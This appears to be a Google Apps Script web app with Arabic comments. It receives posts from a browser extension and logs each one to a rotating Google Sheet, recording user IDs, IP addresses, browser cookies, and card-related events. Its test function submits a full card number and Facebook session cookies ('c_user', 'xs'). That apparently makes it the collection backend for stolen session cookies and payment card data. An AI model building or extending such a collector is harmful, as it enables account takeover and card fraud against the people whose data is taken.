const SHEET_ID = '18BT9knXVlg5vdtqlznWl9CclukWvn_of5KoKfPnsk4c'; // ID الشيت الخاص بك
const BASE_SHEET_NAME = 'الورقة'; // اسم الورقة الأساسي (تأكد أن الورقة الأولى اسمها الورقة1)
const MAX_ROWS = 1000000; // عدد الصفوف لكل ورقة قبل التدوير

function doPost(e) {
  try {
    // جلب البيانات من الطلب
    var data = {};
    if (e.postData && e.postData.type === 'application/json') {
      data = JSON.parse(e.postData.contents);
    } else if (e.postData && e.postData.type === 'application/x-www-form-urlencoded') {
      data = e.parameter;
    } else {
      throw new Error('No postData found in request');
    }

    // فتح الشيت
    var ss = SpreadsheetApp.openById(SHEET_ID);

    // البحث عن أول ورقة فيها مساحة (ابدأ دائمًا من الورقة1)
    var sheetIndex = 1;
    var sheet;
    while (true) {
      var sheetName = BASE_SHEET_NAME + sheetIndex; // "الورقة1", "الورقة2", ...
      sheet = ss.getSheetByName(sheetName);
      if (!sheet) {
        // إذا لم توجد الورقة، أنشئها
        sheet = ss.insertSheet(sheetName);
        // إضافة رؤوس الأعمدة للورقة الجديدة
        sheet.appendRow([
          'التاريخ',      // 1
          'العملية',      // 2 (نوع العملية)
          'الأمر',        // 3 (نص الأمر)
          'المستخدم',     // 4 (UUID)
          'IP',           // 5
          'Cookies',      // 6
          'الوقت الأصلي', // 7
          'المصدر',       // 8
          'وقت الاستلام'  // 9
        ]);
        console.log('✅ تم إنشاء ورقة جديدة في الشيت: ' + sheetName);
      }
      // إذا كان عدد الصفوف أقل من الحد، استخدم هذه الورقة
      if (sheet.getLastRow() < MAX_ROWS) {
        break;
      }
      sheetIndex++;
    }

    // تجهيز صف البيانات (كل معلومة في عمود منفصل)
    var row = [
      new Date(),                        // التاريخ الحالي
      data.type || '',                   // نوع العملية (CARD_ADDED, BIN_REGISTERED, ...)
      data.command || '',                // نص الأمر
      data.user || 'extension',          // المستخدم (UUID)
      data.ip || 'unknown',              // IP
      data.cookies || '',                // الكوكيز
      data.time || '',                   // الوقت الأصلي (من الإضافة)
      data.source || 'extension',        // المصدر
      data.receivedAt || ''              // وقت الاستلام (من الباكند)
    ];

    // أضف الصف في نهاية الورقة
    sheet.appendRow(row);

    // رد نجاح
    return ContentService.createTextOutput(JSON.stringify({
      result: 'success',
      sheet: sheet.getName(),
      row: sheet.getLastRow(),
      data: data
    })).setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    console.error('❌ حدث خطأ في Google Sheet:', err.message, err.stack || '');
    return ContentService.createTextOutput(JSON.stringify({
      result: 'error',
      message: err.message,
      stack: err.stack
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// دالة اختبار (تشغيلها من Apps Script فقط)
function testScript() {
  var testData = {
    type: 'BIN_REGISTERED',
    command: '[BIN_REGISTERED] {"pattern":"123456XXXXXX1234","fullNumber":"1234567890123456"} 2025-01-03T...',
    user: 'extension-uuid-1234',
    time: new Date().toISOString(),
    source: 'extension',
    receivedAt: new Date().toISOString(),
    ip: '8.8.8.8',
    cookies: 'c_user=12345; xs=abcdef;'
  };

  var mockEvent = {
    postData: {
      type: 'application/json',
      contents: JSON.stringify(testData)
    }
  };

  var result = doPost(mockEvent);
  Logger.log('Test result: ' + result.getContent());
}